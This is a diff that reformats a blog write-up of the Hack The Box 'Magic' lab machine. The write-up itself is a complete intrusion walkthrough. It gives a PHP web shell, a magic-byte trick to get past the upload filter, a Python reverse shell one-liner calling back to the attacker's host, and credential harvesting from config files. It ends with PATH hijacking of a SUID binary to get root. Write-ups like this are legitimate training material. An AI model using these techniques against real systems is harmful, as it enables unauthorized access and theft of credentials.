@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Magic"
-date:   2020-08-23 00:38:00 +0800
-categories: hackthebox
-tags: linux sqli php magic path
+title: Hack The Box - Magic
+date: 2020-08-23 00:38:00 +0800
+categories: [hackthebox]
+tags: [linux, sqli, php, magic, path]
 ---
 
 ![](/assets/images/magic.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.185 magic.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC magic.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 11:51 EDT
 Nmap scan report for magic.htb (10.10.10.185)
@@ -41,7 +40,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -69,7 +68,7 @@ So, the application wants me to support an image. However, based on experience, 
 
 First, lets first create our web shell. If we manage to upload this, we basically can run any commands on the box!
 
-{% highlight bash %}
+```bash
 $ cat shell.php
 <?php
     if(isset($_GET['cmd']))
@@ -77,30 +76,30 @@ $ cat shell.php
         system($_GET['cmd']);
     }
 ?>
-{% endhighlight %}
+```
 
 Lets think about what kind of checks might be in place. Maybe they are checking the file extension?
 
-{% highlight bash %}
+```bash
 $ mv shell.php shell.php.jpeg
-{% endhighlight %}
+```
 
 ![](/assets/images/magic5.png)
 
 They probably are but its still not good enough... Well since this box is called "Magic", perhaps they are checking the magic bytes of the file uploaded? The magic bytes of a file is used to identify what type of file it is so that the system can properly interpret it and process accordingly. We can use the `file` command to see what our file is interpreted as.
 
-{% highlight bash %}
+```bash
 $ file shell.php.jpeg
 shell.php.jpeg: PHP script, ASCII text
-{% endhighlight %}
+```
 
 Well, our file is definitely not recognized as a `JPEG` file. According to this [link](https://www.filesignatures.net/index.php?page=search&search=JFIF&mode=EXT), the magic bytes of a `JPEG` file is `FF D8 FF E0`. Hence, we can just append these bytes to the front of our file.
 
-{% highlight bash %}
+```bash
 $ echo -e "$(python -c "print '\xFF\xD8\xFF\xE0'")$(cat shell.php.jpeg)" > shell.php.jpeg
 $ file shell.php.jpeg
 shell.php.jpeg: JPEG image data
-{% endhighlight %}
+```
 
 Now lets try uploading it.
 
@@ -122,27 +121,27 @@ We see that we can now arbitrary commands! The next step is probably to establis
 
 Starting our listener...
 
-{% highlight bash %}
+```bash
 $ nc -lvnp 1337
 listening on [any] 1337 ...
-{% endhighlight %}
+```
 
 And by visiting `http://magic.htb/images/uploads/shell.php.jpeg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
 
 We now have a reverse shell.
 
-{% highlight bash %}
+```bash
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.185] 48482
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ python3 -c "import pty;pty.spawn('/bin/bash')"
 www-data@ubuntu:/var/www/Magic/images/uploads$
-{% endhighlight %}
+```
 
 As `www-data`, we can check out what files are there in the root directory of the web service. In `/var/www/Magic`, there were 2 files of interest.
 
-{% highlight bash %}
+```bash
 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/db.php5
 <?php
 class Database
@@ -152,38 +151,38 @@ class Database
     private static $dbUsername = 'theseus';
     private static $dbUserPassword = 'iamkingtheseus';
 ...
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/backup.sql
 ...
 INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
 ...
-{% endhighlight %}
+```
 `
 We got 2 usernames, `theseus` and `admin`, and 2 passwords, `iamkingtheseus` and `Th3s3usW4sK1ng`. Let see what users we have in `/home`.
 
-{% highlight bash %}
+```bash
 $ ls /home
 theseus
-{% endhighlight %}
+```
 
 # user.txt
 
 I guess we now know what to do. Using the 2 passwords we found, we manage to `su` to `theseus`.
 
-{% highlight bash %}
+```bash
 www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
 Th3s3usW4sK1ng
 theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt
 a9aaXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 Lets run [`LinEnum.sh`](https://github.com/rebootuser/LinEnum) to see we can find anything to help use escalate our privileges.
 
-{% highlight bash %}
+```bash
 theseus@ubuntu:/var/www/Magic/images/uploads$ wget http://10.10.XX.XX/LinEnum.sh
 --2020-08-22 04:59:07--  http://10.10.XX.XX/LinEnum.sh
 Connecting to 10.10.XX.XX:80... connected.
@@ -201,49 +200,49 @@ theseus@ubuntu:/tmp$ chmod +x LinEnum.sh
 ...
 -rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
 ...
-{% endhighlight %}
+```
 
 `sysinfo` is not a binary commonly found in Linux distributions so lets look into it. When executing it, it prints information related to your memory, your disk and your CPU information. But if we look deeper into it,
 
-{% highlight bash %}
+```bash
 theseus@ubuntu:/tmp$ ltrace /bin/sysinfo 2>&1 | grep popen
 ltrace /bin/sysinfo 2>&1 | grep popen
 popen("lshw -short", "r")                        = 0x5579b300ee80
 popen("fdisk -l", "r")                           = 0x5579b300ee80
 popen("cat /proc/cpuinfo", "r")                  = 0x5579b300ee80
 popen("free -h", "r")                            = 0x5579b300ee80
-{% endhighlight %}
+```
 
 It is actually running other commands to retrieve the above said information! Since the path of the binaries executed is not full, we can manipulate our `$PATH` variable so that our own code will be executed instead of the legitimate binary! We got 4 choices but I will choose `free`.
 
 Preparing our payload:
 
-{% highlight bash %}
+```bash
 theseus@ubuntu:/tmp$ echo "/bin/bash" >> /tmp/free
 theseus@ubuntu:/tmp$ chmod +x free
-{% endhighlight %}
+```
 
 Manipulating our `$PATH` variable so that the OS will check `/tmp` for `free`:
 
-{% highlight bash %}
+```bash
 theseus@ubuntu:/tmp$ PATH=/tmp:$PATH
 theseus@ubuntu:/tmp$ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-{% endhighlight %}
+```
 
 And now finally, if we run `/bin/sysinfo`:
 
-{% highlight bash %}
+```bash
 theseus@ubuntu:/tmp$ /bin/sysinfo
 ====================Hardware Info====================
 root@ubuntu:/tmp#
-{% endhighlight %}
+```
 
 # root.txt
 
 We are now root! However, the output of commands will not be printed until I exit the current shell.
 
-{% highlight bash %}
+```bash
 root@ubuntu:/tmp# cat /root/root.txt
 cat /root/root.txt
 root@ubuntu:/tmp# exit
@@ -251,6 +250,6 @@ exit
 exit
 4328XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 theseus@ubuntu:/tmp$
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
